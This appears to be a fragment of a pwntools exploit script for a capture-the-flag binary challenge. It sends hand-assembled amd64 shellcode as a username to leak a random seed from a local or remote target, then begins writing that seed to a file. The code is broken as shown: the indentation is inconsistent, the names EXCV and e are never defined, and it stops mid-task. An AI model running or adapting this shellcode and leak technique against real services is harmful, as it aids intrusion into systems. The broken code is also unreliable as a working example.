from pwn import *

    io = process(EXCV)

    libc = e.libc

if REMOTE:

    io = remote(HOST,PORT)

    libc = ELF('libc-2.23.so')

#------------------------Data-------------------------



shellcode = asm("pop rax; push rsp; pop rcx; pop rdx; push rsp; pop rdi;syscall;",arch='amd64',os = 'linux')

pad_len = 0x10+8

rip = 0x40000



#------------------------Function---------------------



def leak_seed():

    io.recvuntil('Username: ')

    io.send(shellcode)

    io.recvuntil(shellcode)

    seed = u32(io.recv(4))

    return seed



#-----------------------------------------------------



seed = leak_seed()

io.success('seed :'+hex(seed))

fp = open("seed.txt",'w')
